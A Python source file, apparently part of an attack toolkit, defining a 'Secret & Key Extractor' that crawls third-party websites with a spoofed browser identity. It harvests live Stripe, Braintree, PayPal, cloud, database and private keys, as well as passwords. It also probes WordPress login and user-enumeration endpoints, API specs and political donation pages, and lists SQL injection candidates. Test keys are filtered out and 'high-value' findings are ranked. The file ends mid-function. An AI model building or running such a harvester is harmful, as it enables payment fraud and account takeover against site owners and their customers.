"""
Secret & Key Extractor — Extract API keys, gateway credentials, secrets from web pages

Scans HTML source code for exposed:
1. Payment gateway keys (Stripe pk/sk, Braintree, PayPal, Square, Adyen, etc.)
2. Cloud credentials (AWS, GCP, Azure)
3. Database connection strings
4. API tokens & OAuth secrets
5. .env file contents
6. Hardcoded passwords
"""

import re
import asyncio
import aiohttp
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from loguru import logger


@dataclass
class ExtractedSecret:
    """A single extracted secret/key."""
    url: str
    type: str  # stripe_pk, stripe_sk, aws_key, etc.
    category: str  # gateway, cloud, database, api, credential
    key_name: str  # Human-readable name
    value: str  # The actual secret value
    context: str = ""  # Surrounding text for validation
    confidence: float = 0.9
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class SecretExtractor:
    """Extracts secrets, API keys, and gateway credentials from web pages."""
    
    # Secret patterns: (name, category, type, regex, confidence)
    PATTERNS = [
        # =============== PAYMENT GATEWAY KEYS (PRIMARY) ===============
        
        # Stripe
        ("Stripe Publishable Key", "gateway", "stripe_pk",
         re.compile(r'(?:pk_live_[A-Za-z0-9_-]{20,120})', re.I), 0.99),
        ("Stripe Secret Key", "gateway", "stripe_sk",
         re.compile(r'(?:sk_live_[A-Za-z0-9_-]{20,120})', re.I), 0.99),
        ("Stripe Restricted Key", "gateway", "stripe_rk",
         re.compile(r'(?:rk_live_[A-Za-z0-9_-]{20,120})', re.I), 0.99),
        ("Stripe Webhook Secret", "gateway", "stripe_whsec",
         re.compile(r'(?:whsec_[A-Za-z0-9_-]{20,120})', re.I), 0.95),
        ("Stripe Test PK", "gateway", "stripe_pk_test",
         re.compile(r'(?:pk_test_[A-Za-z0-9_-]{20,120})', re.I), 0.80),
        ("Stripe Test SK", "gateway", "stripe_sk_test",
         re.compile(r'(?:sk_test_[A-Za-z0-9_-]{20,120})', re.I), 0.85),
        ("Stripe Connect Account", "gateway", "stripe_acct",
         re.compile(r'(?:acct_[A-Za-z0-9_-]{12,40})', re.I), 0.85),
        ("Stripe Payment Intent", "gateway", "stripe_pi",
         re.compile(r'(?:pi_[A-Za-z0-9_-]{20,60})', re.I), 0.80),
        ("Stripe Client Secret", "gateway", "stripe_client_secret",
         re.compile(r'(?:pi_[A-Za-z0-9_-]+_secret_[A-Za-z0-9_-]+)', re.I), 0.90),
        
        # Braintree
        ("Braintree Tokenization Key", "gateway", "braintree_token",
         re.compile(r'(?:sandbox|production)_[a-z0-9]{8}_[a-z0-9]{16,32}', re.I), 0.90),
        ("Braintree Merchant ID", "gateway", "braintree_merchant",
         re.compile(r'(?:merchant[_\-]?id|merchantId)["\s:=]+["\']?([a-z0-9]{12,20})["\']?', re.I), 0.75),
        ("Braintree Client Token", "gateway", "braintree_client",
         re.compile(r'(?:braintree[._-]?(?:client[._-]?)?token)["\s:=]+["\']([A-Za-z0-9+/=_-]{50,1000})["\']', re.I), 0.85),
        
        # PayPal
        ("PayPal Client ID", "gateway", "paypal_client",
         re.compile(r'(?:paypal|pp)[._-]?client[._-]?id["\s:=]+["\']?([A-Za-z0-9_-]{50,100})["\']?', re.I), 0.85),
        ("PayPal Secret", "gateway", "paypal_secret",
         re.compile(r'(?:paypal|pp)[._-]?(?:secret|client_secret)["\s:=]+["\']?([A-Za-z0-9_-]{50,100})["\']?', re.I), 0.90),
        ("PayPal SDK", "gateway", "paypal_sdk",
         re.compile(r'paypal\.com/sdk/js\?client-id=([A-Za-z0-9_-]{30,100})', re.I), 0.85),
        
        # Square
        ("Square Access Token", "gateway", "square_token",
         re.compile(r'(?:sq0atp-[A-Za-z0-9_-]{22,60})', re.I), 0.95),
        ("Square OAuth Secret", "gateway", "square_secret",
         re.compile(r'(?:sq0csp-[A-Za-z0-9_-]{40,60})', re.I), 0.95),
        ("Square Application ID", "gateway", "square_app",
         re.compile(r'(?:sq0idp-[A-Za-z0-9_-]{22,60})', re.I), 0.90),
        
        # Adyen
        ("Adyen API Key", "gateway", "adyen_key",
         re.compile(r'(?:adyen)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{30,100})["\']?', re.I), 0.85),
        ("Adyen Client Key", "gateway", "adyen_client",
         re.compile(r'(?:adyen)[._-]?(?:client[._-]?)?key["\s:=]+["\']?((?:test|live)_[A-Za-z0-9]{20,50})["\']?', re.I), 0.85),
        
        # Authorize.net
        ("Authorize.net Login ID", "gateway", "authnet_login",
         re.compile(r'(?:x_login|api_login_id|apiLoginID)["\s:=]+["\']?([A-Za-z0-9]{8,25})["\']?', re.I), 0.80),
        ("Authorize.net Transaction Key", "gateway", "authnet_key",
         re.compile(r'(?:x_tran_key|transaction_key|transactionKey)["\s:=]+["\']?([A-Za-z0-9]{12,20})["\']?', re.I), 0.85),
        
        # Checkout.com
        ("Checkout.com PK", "gateway", "checkout_pk",
         re.compile(r'pk_(?:sbox_|test_|live_)?[a-zA-Z0-9_-]{20,80}', re.I), 0.80),
        ("Checkout.com SK", "gateway", "checkout_sk",
         re.compile(r'sk_(?:sbox_|test_|live_)?[a-zA-Z0-9_-]{20,80}', re.I), 0.85),
        
        # Worldpay
        ("Worldpay Service Key", "gateway", "worldpay_key",
         re.compile(r'(?:worldpay|wp)[._-]?(?:service[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,80})["\']?', re.I), 0.85),
        
        # NMI
        ("NMI Security Key", "gateway", "nmi_key",
         re.compile(r'(?:nmi|network_merchants)[._-]?(?:security[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,60})["\']?', re.I), 0.80),
        
        # 2Checkout
        ("2Checkout Merchant Code", "gateway", "2checkout_merchant",
         re.compile(r'(?:2checkout|tco)[._-]?(?:merchant|seller)[._-]?(?:code|id)["\s:=]+["\']?([A-Za-z0-9]{6,20})["\']?', re.I), 0.75),
        
        # WooCommerce Stripe (embedded in JS vars)
        ("WC Stripe PK (UPE)", "gateway", "stripe_pk",
         re.compile(r'wc_stripe_(?:upe_)?params\s*=\s*\{[^}]*?"key"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]{20,99})"', re.I), 0.99),
        ("WC Stripe PMC", "gateway", "stripe_pmc",
         re.compile(r'paymentMethodConfigurationParentId"\s*:\s*"(pmc_[A-Za-z0-9]{20,40})"', re.I), 0.90),
        ("WC Stripe Account", "gateway", "stripe_acct",
         re.compile(r'accountDescriptor"\s*:\s*"([^"]{2,60})"', re.I), 0.70),
        
        # WooCommerce Braintree PayPal
        ("WC Braintree PayPal Gateway", "gateway", "braintree_paypal",
         re.compile(r'WC_Braintree_(?:PayPal|Credit_Card)_Payment_Form_Handler\s*\(\s*(\{[^)]{50,500})', re.I), 0.90),
        ("WC Braintree Client Token Nonce", "gateway", "braintree_token_nonce",
         re.compile(r'client_token_nonce"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        
        # WordPress AJAX & Nonces
        ("WP AJAX URL", "config", "wp_ajax_url",
         re.compile(r'(?:ajax_url|ajaxurl)\s*[=:]\s*["\']?(https?://[^"\' ]+admin-ajax\.php)', re.I), 0.80),
        ("WP Nonce", "config", "wp_nonce",
         re.compile(r'(?:_wpnonce|nonce|security)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.70),
        ("WC Checkout Nonce", "gateway", "wc_checkout_nonce",
         re.compile(r'(?:createPaymentIntentNonce|updatePaymentIntentNonce|createSetupIntentNonce)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        ("WC AJAX URL", "config", "wc_ajax_url",
         re.compile(r'wc_ajax_url"\s*:\s*"([^"]+)"', re.I), 0.75),
        
        # Generic payment
        ("Publishable Key (Generic)", "gateway", "generic_pk",
         re.compile(r'(?:publishable[._-]?key|public[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.70),
        ("Secret Key (Generic)", "gateway", "generic_sk",
         re.compile(r'(?:secret[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.75),
        ("Merchant ID (Generic)", "gateway", "generic_merchant",
         re.compile(r'(?:merchant[._-]?id)["\s:=]+["\']?([A-Za-z0-9_-]{8,40})["\']?', re.I), 0.60),
        
        # =============== CLOUD CREDENTIALS ===============
        
        # AWS
        ("AWS Access Key", "cloud", "aws_access",
         re.compile(r'(?:AKIA[0-9A-Z]{16})', re.I), 0.95),
        ("AWS Secret Key", "cloud", "aws_secret",
         re.compile(r'(?:aws[._-]?secret[._-]?(?:access[._-]?)?key)["\s:=]+["\']?([A-Za-z0-9/+=]{40})["\']?', re.I), 0.90),
        ("AWS Session Token", "cloud", "aws_session",
         re.compile(r'(?:aws[._-]?session[._-]?token)["\s:=]+["\']?([A-Za-z0-9/+=]{100,500})["\']?', re.I), 0.85),
        ("AWS Account ID", "cloud", "aws_account",
         re.compile(r'(?:aws[._-]?account[._-]?id)["\s:=]+["\']?(\d{12})["\']?', re.I), 0.80),
        
        # GCP
        ("GCP API Key", "cloud", "gcp_key",
         re.compile(r'AIza[0-9A-Za-z_-]{35}', re.I), 0.90),
        ("GCP Service Account", "cloud", "gcp_service",
         re.compile(r'[a-z0-9-]+@[a-z0-9-]+\.iam\.gserviceaccount\.com', re.I), 0.85),
        
        # Azure
        ("Azure Storage Key", "cloud", "azure_storage",
         re.compile(r'(?:DefaultEndpointsProtocol|AccountKey)[=][A-Za-z0-9+/=]{40,100}', re.I), 0.90),
        ("Azure Connection String", "cloud", "azure_conn",
         re.compile(r'(?:Server|Data Source)=tcp:[a-z0-9.-]+\.database\.windows\.net', re.I), 0.85),
        
        # DigitalOcean
        ("DigitalOcean Token", "cloud", "do_token",
         re.compile(r'(?:do[._-]?(?:api[._-]?)?token|digitalocean[._-]?token)["\s:=]+["\']?([a-f0-9]{64})["\']?', re.I), 0.85),
        
        # =============== DATABASE CREDENTIALS ===============
        
        ("MySQL Connection", "database", "mysql_conn",
         re.compile(r'mysql://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("PostgreSQL Connection", "database", "pg_conn",
         re.compile(r'(?:postgres(?:ql)?|psql)://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("MongoDB Connection", "database", "mongo_conn",
         re.compile(r'mongodb(?:\+srv)?://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("Redis Connection", "database", "redis_conn",
         re.compile(r'redis://[^:]*:[^@]+@[^/]+(?:/\d+)?', re.I), 0.85),
        ("JDBC Connection", "database", "jdbc_conn",
         re.compile(r'jdbc:[a-z]+://[^:]+(?::\d+)?/\w+(?:\?[^\s"\'<>]+)?', re.I), 0.80),
        ("DB Password", "database", "db_password",
         re.compile(r'(?:DB[._-]?PASS(?:WORD)?|DATABASE[._-]?PASS(?:WORD)?)["\s:=]+["\']?([^\s"\'<>]{5,60})["\']?', re.I), 0.85),
        ("DB Host", "database", "db_host",
         re.compile(r'(?:DB[._-]?HOST|DATABASE[._-]?HOST)["\s:=]+["\']?([^\s"\'<>]{5,100})["\']?', re.I), 0.70),
        
        # =============== API TOKENS & OAUTH ===============
        
        ("Bearer Token", "api", "bearer",
         re.compile(r'[Bb]earer\s+([A-Za-z0-9._~+/=-]{20,500})', re.I), 0.80),
        ("JWT Token", "api", "jwt",
         re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', re.I), 0.85),
        ("GitHub Token", "api", "github_token",
         re.compile(r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}', re.I), 0.95),
        ("GitHub OAuth", "api", "github_oauth",
         re.compile(r'(?:github[._-]?(?:oauth[._-]?)?(?:client[._-]?)?secret)["\s:=]+["\']?([A-Za-z0-9]{30,50})["\']?', re.I), 0.85),
        ("Slack Token", "api", "slack_token",
         re.compile(r'xox[bpsa]-[A-Za-z0-9-]{10,250}', re.I), 0.95),
        ("Slack Webhook", "api", "slack_webhook",
         re.compile(r'hooks\.slack\.com/services/T[A-Za-z0-9]+/B[A-Za-z0-9]+/[A-Za-z0-9]+', re.I), 0.90),
        ("Discord Webhook", "api", "discord_webhook",
         re.compile(r'discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+', re.I), 0.90),
        ("Discord Bot Token", "api", "discord_bot",
         re.compile(r'[MN][A-Za-z0-9]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,40}', re.I), 0.80),
        ("Telegram Bot Token", "api", "telegram_bot",
         re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35}', re.I), 0.85),
        # Twilio suppressed — AC[a-f0-9]{32} regex is too broad, matches random hex on academic sites
        # ("Twilio Account SID", "api", "twilio_sid",
        #  re.compile(r'AC[a-f0-9]{32}', re.I), 0.90),
        # ("Twilio Auth Token", "api", "twilio_token",
        #  re.compile(r'(?:twilio[._-]?(?:auth[._-]?)?token)["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("SendGrid API Key", "api", "sendgrid_key",
         re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}', re.I), 0.95),
        ("Mailgun API Key", "api", "mailgun_key",
         re.compile(r'key-[a-f0-9]{32}', re.I), 0.90),
        ("Shopify Access Token", "api", "shopify_token",
         re.compile(r'shpat_[a-f0-9]{32}', re.I), 0.95),
        ("Shopify API Key", "api", "shopify_api",
         re.compile(r'shpka_[a-f0-9]{32}', re.I), 0.90),
        ("Facebook Token", "api", "facebook_token",
         re.compile(r'(?:facebook[._-]?(?:access[._-]?)?token|fb[._-]?token)["\s:=]+["\']?([A-Za-z0-9|]{50,300})["\']?', re.I), 0.80),
        ("Twitter API Key", "api", "twitter_key",
         re.compile(r'(?:twitter|tw)[._-]?(?:api[._-]?)?(?:key|consumer[._-]?key)["\s:=]+["\']?([A-Za-z0-9]{20,40})["\']?', re.I), 0.80),
        ("Mapbox Token", "api", "mapbox_token",
         re.compile(r'pk\.[A-Za-z0-9]{60,}', re.I), 0.80),
        
        # =============== PRIVATE KEYS & CERTIFICATES ===============
        
        ("RSA Private Key", "credential", "rsa_key",
         re.compile(r'-----BEGIN RSA PRIVATE KEY-----', re.I), 0.99),
        ("EC Private Key", "credential", "ec_key",
         re.compile(r'-----BEGIN EC PRIVATE KEY-----', re.I), 0.99),
        ("Private Key (Generic)", "credential", "private_key",
         re.compile(r'-----BEGIN PRIVATE KEY-----', re.I), 0.99),
        ("PGP Private Key", "credential", "pgp_key",
         re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----', re.I), 0.99),
        ("SSH Private Key", "credential", "ssh_key",
         re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----', re.I), 0.99),
        
        # =============== MISC CREDENTIALS ===============
        
        ("Hardcoded Password", "credential", "password",
         re.compile(r'(?:password|passwd|pwd|pass)["\s:=]+["\']([^\s"\'<>]{6,50})["\']', re.I), 0.65),
        ("Admin Password", "credential", "admin_password",
         re.compile(r'(?:admin[._-]?password|admin[._-]?pass|root[._-]?password)["\s:=]+["\']([^\s"\'<>]{4,50})["\']', re.I), 0.80),
        ("Email + Password", "credential", "email_password",
         re.compile(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)[:\s|]+([^\s"\'<>]{6,50})', re.I), 0.60),
        ("Secret Key (Django/Flask)", "credential", "framework_secret",
         re.compile(r'SECRET_KEY["\s:=]+["\']([A-Za-z0-9!@#$%^&*()_+-=]{20,100})["\']', re.I), 0.85),
        
        # =============== .ENV FILE PATTERNS ===============
        
        ("ENV Variable", "config", "env_var",
         re.compile(r'^([A-Z][A-Z0-9_]{2,50})=([^\s]{3,200})$', re.M), 0.50),
    ]
    
    # False positive filters (skip matches containing these)
    FALSE_POSITIVE_INDICATORS = [
        "example", "sample", "test", "demo", "placeholder", "your_",
        "xxx", "TODO", "FIXME", "INSERT", "CHANGE_ME", "your-",
        "12345", "abcdef", "000000", "aaaa", "bbbb",
    ]
    
    def __init__(self, timeout: int = 10, max_concurrent: int = 20):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.seen_values: Set[str] = set()  # Dedup

    def _is_false_positive(self, value: str) -> bool:
        """Check if extracted value looks like a false positive."""
        value_lower = value.lower()
        for indicator in self.FALSE_POSITIVE_INDICATORS:
            if indicator in value_lower:
                return True
        # Too short or all same chars
        if len(value) < 8:
            return True
        if len(set(value)) < 4:
            return True
        return False

    def extract_from_text(self, text: str, url: str = "") -> List[ExtractedSecret]:
        """Extract secrets from text content.
        
        Args:
            text: HTML/text content to scan
            url: Source URL for attribution
            
        Returns:
            List of ExtractedSecret findings
        """
        secrets = []
        
        for name, category, secret_type, pattern, confidence in self.PATTERNS:
            matches = pattern.finditer(text)
            for match in matches:
                # Get the matched value
                value = match.group(1) if match.lastindex and match.lastindex >= 1 else match.group(0)
                
                if not value or self._is_false_positive(value):
                    continue
                
                # Dedup
                if value in self.seen_values:
                    continue
                self.seen_values.add(value)
                
                # Get surrounding context (100 chars before and after)
                start = max(0, match.start() - 100)
                end = min(len(text), match.end() + 100)
                context = text[start:end].replace("\n", " ").strip()
                
                secret = ExtractedSecret(
                    url=url,
                    type=secret_type,
                    category=category,
                    key_name=name,
                    value=value,
                    context=context,
                    confidence=confidence,
                )
                secrets.append(secret)
                logger.info(f"Found {name}: {value[:20]}... from {url}")
        
        return secrets

    async def extract_from_url(self, url: str, 
                                session: aiohttp.ClientSession = None) -> List[ExtractedSecret]:
        """Fetch a URL and extract secrets from its content.
        
        Args:
            url: Target URL to scan
            session: Optional aiohttp session
            
        Returns:
            List of ExtractedSecret findings
        """
        own_session = False
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    }
                )
                own_session = True
            
            async with self.semaphore:
                async with session.get(url, allow_redirects=True, ssl=False) as resp:
                    text = await resp.text(errors="ignore")
                    return self.extract_from_text(text, url)
        
        except asyncio.TimeoutError:
            logger.debug(f"Timeout extracting from {url}")
        except Exception as e:
            logger.debug(f"Error extracting from {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return []

    async def batch_extract(self, urls: List[str]) -> List[ExtractedSecret]:
        """Extract secrets from multiple URLs concurrently.
        
        Args:
            urls: List of URLs to scan
            
        Returns:
            Combined list of all findings
        """
        all_secrets = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
        ) as session:
            tasks = [self.extract_from_url(url, session) for url in urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_secrets.extend(result)
        
        return all_secrets

    def get_gateway_secrets(self, secrets: List[ExtractedSecret]) -> List[ExtractedSecret]:
        """Filter secrets to only gateway/payment related."""
        return [s for s in secrets if s.category == "gateway"]

    def get_high_value_secrets(self, secrets: List[ExtractedSecret]) -> List[ExtractedSecret]:
        """Filter to high-value secrets (gateways, cloud, database)."""
        return [s for s in secrets if s.confidence >= 0.80 and 
                s.category in ("gateway", "cloud", "database", "credential")]

    # Payment-related paths to auto-discover
    PAYMENT_PATHS = [
        "/checkout/", "/cart/", "/my-account/", "/shop/",
        "/donate/", "/payment/", "/billing/", "/subscribe/",
        "/membership/", "/order/", "/purchase/", "/pay/",
        "/?add-to-cart=1",  # WooCommerce trigger
    ]
    
    # Extra endpoint paths for discovery (login, admin, config, etc.)
    ENDPOINT_PATHS = [
        "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
        "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages", "/wp-json/wc/v3/products",
        "/?rest_route=/wp/v2/users",  # Non-pretty permalink fallback
        "/?s=test",  # Search
        "/feed/", "/sitemap.xml", "/robots.txt",
        "/admin/", "/administrator/", "/login/",
        "/api/", "/graphql",
        # Swagger / OpenAPI spec discovery
        "/swagger.json", "/openapi.json",
        "/api-docs/openapi.json", "/api-docs/swagger.json",
        "/api-docs/", "/api-docs.json",
        "/swagger/", "/swagger-ui/", "/swagger-ui.html",
        "/api/swagger.json", "/api/openapi.json",
        "/swagger/v1/swagger.json",
        # Political donation platforms
        "/actblue/", "/anedot/", "/winred/",
    ]

    async def deep_extract_site(self, url: str,
                                 session: aiohttp.ClientSession = None) -> dict:
        """Deep extract: scan the given URL + auto-discover payment pages on the same domain.
        
        Returns dict with:
          - secrets: List[ExtractedSecret]
          - platform: dict from detect_platform()
          - endpoints: dict from discover_endpoints()
          - sqli_candidates: list from get_sqli_candidates()
          - pages_scanned: int
        """
        own_session = False
        if session is None:
            session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                }
            )
            own_session = True
        
        all_secrets = []
        parsed = __import__('urllib.parse', fromlist=['urlparse']).urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        platform_info = None
        endpoints_info = {}
        sqli_candidates = []
        pages_scanned = 0
        
        try:
            # 1. Scan the original URL and gather platform/endpoint info
            secrets = await self.extract_from_url(url, session)
            all_secrets.extend(secrets)
            pages_scanned += 1
            
            try:
                async with session.get(url, ssl=False, allow_redirects=True) as resp:
                    main_html = await resp.text(errors='ignore')
                    platform_info = self.detect_platform(main_html)
                    endpoints_info = self.discover_endpoints(main_html, base)
                    sqli_candidates = self.get_sqli_candidates(endpoints_info, base)
            except Exception:
                pass
            
            # 2. Scan payment-related paths
            for path in self.PAYMENT_PATHS:
                payment_url = base + path
                if payment_url == url:
                    continue
                try:
                    page_secrets = await self.extract_from_url(payment_url, session)
                    all_secrets.extend(page_secrets)
                    pages_scanned += 1
                    
                    # Also gather platform info from payment pages (may have more gateways loaded)
                    if platform_info:
                        async with session.get(payment_url, ssl=False, allow_redirects=True) as resp:
                            if resp.status == 200:
                                pay_html = await resp.text(errors='ignore')
                                pay_info = self.detect_platform(pay_html)
                                for gw in pay_info.get('gateways', []):
                                    if gw not in platform_info['gateways']:
                                        platform_info['gateways'].append(gw)
                                # Merge endpoint discoveries  
                                pay_endpoints = self.discover_endpoints(pay_html, base)
                                for key in pay_endpoints:
                                    for ep in pay_endpoints[key]:
                                        if ep not in endpoints_info.get(key, []):
                                            endpoints_info.setdefault(key, []).append(ep)
                except Exception:
                    pass
            
            # 3. Scan endpoint discovery paths (login, API, etc.)
            for path in self.ENDPOINT_PATHS:
                ep_url = base + path
                try:
                    async with session.get(ep_url, ssl=False, allow_redirects=False) as resp:
                        if resp.status in (200, 301, 302, 403):
                            # Page exists — interesting
                            if resp.status == 200:
                                ep_html = await resp.text(errors='ignore')
                                ep_secrets = self.extract_from_text(ep_html, ep_url)
                                all_secrets.extend(ep_secrets)
                                pages_scanned += 1
                                
                                # wp-json/wp/v2/users can expose usernames
                                if '/wp/v2/users' in path and '"slug"' in ep_html:
                                    all_secrets.append(ExtractedSecret(
                                        url=ep_url,
                                        type="wp_users_exposed",
                                        category="config",
                                        key_name="WP Users API (Exposed)",
                                        value=ep_url,
                                        confidence=0.90,
                                    ))
                            elif resp.status == 403:
                                # Exists but forbidden — still interesting
                                pass
                except Exception:
                    pass
            
            # 4. Discover JS files with gateway references from original page
            try:
                if main_html:
                    scripts = re.findall(
                        r'src=["\']([^"\']*/(?:checkout|payment|stripe|braintree|paypal|square|gateway)[^"\']*)["\'\s>]',
                        main_html, re.I
                    )
                    for script_url in scripts[:10]:
                        if script_url.startswith('//'):
                            script_url = parsed.scheme + ':' + script_url
                        elif script_url.startswith('/'):
                            script_url = base + script_url
                        try:
                            js_secrets = await self.extract_from_url(script_url, session)
                            all_secrets.extend(js_secrets)
                        except Exception:
                            pass
            except Exception:
                pass
            
            # Refresh sqli candidates with all discovered endpoints
            sqli_candidates = self.get_sqli_candidates(endpoints_info, base)
        
        finally:
            if own_session:
                await session.close()
        
        return {
            "secrets": all_secrets,
            "platform": platform_info,
            "endpoints": endpoints_info,
            "sqli_candidates": sqli_candidates,
            "pages_scanned": pages_scanned,
        }
        
        return all_secrets

    def detect_platform(self, html: str) -> dict:
        """Detect CMS, gateway, form type from HTML source.
        
        Uses SDK-specific signatures to avoid false positives:
        - Braintree: only matches js.braintreegateway.com, braintree-web SDK, braintree client tokens
        - Square: only matches squareup.com SDK, sq0 tokens, square-payment-form
        - PayPal: only matches paypal.com/sdk, paypalobjects.com, PayPal client IDs
        - Stripe: only matches js.stripe.com, Stripe() calls, pk_live/pk_test tokens
        """
        info = {
            "platform": None,
            "gateways": [],
            "form_type": None,
            "has_ajax": False,
            "has_nonce": False,
            "has_captcha": False,
            "has_waf": False,
            "endpoints": [],
            "sqli_candidates": [],
        }
        
        html_lower = html.lower()
        
        # Platform — use definitive markers, not just keywords
        if 'wp-content/' in html_lower or 'wp-includes/' in html_lower:
            info['platform'] = 'WordPress'
        elif 'shopify.com' in html_lower or 'cdn.shopify.com' in html_lower:
            info['platform'] = 'Shopify'
        elif 'mage/' in html_lower or '/static/frontend/' in html_lower or 'magento' in html_lower:
            info['platform'] = 'Magento'
        elif 'drupal.js' in html_lower or 'drupal.settings' in html_lower:
            info['platform'] = 'Drupal'
        elif 'joomla' in html_lower and ('/media/system/' in html_lower or '/administrator/' in html_lower):
            info['platform'] = 'Joomla'
        elif 'prestashop' in html_lower:
            info['platform'] = 'PrestaShop'
        
        # Gateways — SDK-specific signatures ONLY (no keyword matching)
        # Stripe: js.stripe.com, Stripe() constructor, pk_ tokens
        stripe_sigs = [
            'js.stripe.com', 'stripe.js', 'stripe(', 'stripe.elements',
            'pk_live_', 'pk_test_', 'stripe.createtoken', 'stripe.confirmcard',
            'stripe.confirmpayment', 'stripepublishablekey', 'stripe_publishable',
            'wc-stripe', 'wc_stripe', 'stripe-payment',
        ]
        if any(sig in html_lower for sig in stripe_sigs):
            if 'wc_stripe_upe' in html_lower:
                info['gateways'].append('Stripe (UPE/embedded)')
            else:
                info['gateways'].append('Stripe')
        
        # Braintree: js.braintreegateway.com, braintree-web SDK, client tokens
        braintree_sigs = [
            'js.braintreegateway.com', 'braintree-web/', 'braintree.client.',
            'braintree.dropin.', 'braintree.hostedfields.', 'braintree.paypal.',
            'braintree-client', 'braintree-hosted-fields', 'braintree-dropin',
            'production_', 'sandbox_',  # tokenization key prefixes
            'wc-braintree', 'wc_braintree', 'client_token_nonce',
        ]
        # Extra validation: "production_" and "sandbox_" must have the right format
        braintree_token_match = bool(re.search(
            r'(?:production|sandbox)_[a-z0-9]{8}_[a-z0-9]{16,32}', html, re.I
        ))
        braintree_sdk = any(sig in html_lower for sig in braintree_sigs[:11])
        if braintree_sdk or braintree_token_match:
            info['gateways'].append('Braintree')
        
        # PayPal: paypal.com/sdk, paypalobjects.com, PayPal client IDs
        paypal_sigs = [
            'paypal.com/sdk', 'paypalobjects.com', 'paypal.buttons(',
            'paypal.checkout.', 'data-paypal-button', 'paypal-button',
            'paypal-sdk', 'paypal.payments.', 'paypal_client_id',
            'wc-paypal', 'ppcp-',
        ]
        if any(sig in html_lower for sig in paypal_sigs):
            info['gateways'].append('PayPal')
        
        # Square: squareup.com SDK, sq0 tokens, square payment form
        square_sigs = [
            'squareup.com', 'square.js', 'sq0atp-', 'sq0csp-', 'sq0idp-',
            'squarepaymentform', 'square-payment-form', 'square.payments(',
            'web.squarecdn.com', 'sandbox.squareup',
        ]
        if any(sig in html_lower for sig in square_sigs):
            info['gateways'].append('Square')
        
        # Adyen: adyen.com checkout SDK, adyen client key
        adyen_sigs = [
            'checkoutshopper-live.adyen.com', 'checkoutshopper-test.adyen.com',
            'adyen.checkout', 'adyencheckout', 'adyen-checkout',
            'test_', 'live_',  # but only if near "adyen"
        ]
        if any(sig in html_lower for sig in adyen_sigs[:5]):
            info['gateways'].append('Adyen')
        elif re.search(r'adyen[\s\S]{0,100}(?:test_|live_)[A-Za-z0-9]{20,}', html, re.I):
            info['gateways'].append('Adyen')
        
        # Checkout.com: checkout.com SDK, frames
        checkoutcom_sigs = [
            'cdn.checkout.com', 'frames.checkout.com', 'checkout.frames',
            'cko-', 'checkout-sdk',
        ]
        if any(sig in html_lower for sig in checkoutcom_sigs):
            info['gateways'].append('Checkout.com')
        
        # Authorize.net
        authnet_sigs = [
            'accept.js', 'jstest.authorize.net', 'js.authorize.net',
            'acceptui', 'authorizenet', 'x_login', 'apiloginid',
        ]
        if any(sig in html_lower for sig in authnet_sigs):
            info['gateways'].append('Authorize.net')
        
        # NMI
        nmi_sigs = ['secure.networkmerchants.com', 'collectjs', 'collect.js', 'nmi_']
        if any(sig in html_lower for sig in nmi_sigs):
            info['gateways'].append('NMI')
        
        # Form type — more precise checks (avoid CSS-only matches)
        # Strip <style> blocks before checking form types to avoid false positives
        import re as _re
        html_no_style = _re.sub(r'<style[^>]*>[\s\S]*?</style>', '', html, flags=_re.I)
        html_no_style_lower = html_no_style.lower()
        
        if ('woocommerce' in html_no_style_lower and 
            ('wc-checkout' in html_no_style_lower or 
             'wc_checkout_params' in html_no_style_lower or 
             '/wc-ajax/' in html_no_style_lower or
             'woocommerce-cart' in html_no_style_lower or
             'class="woocommerce' in html_no_style_lower)):
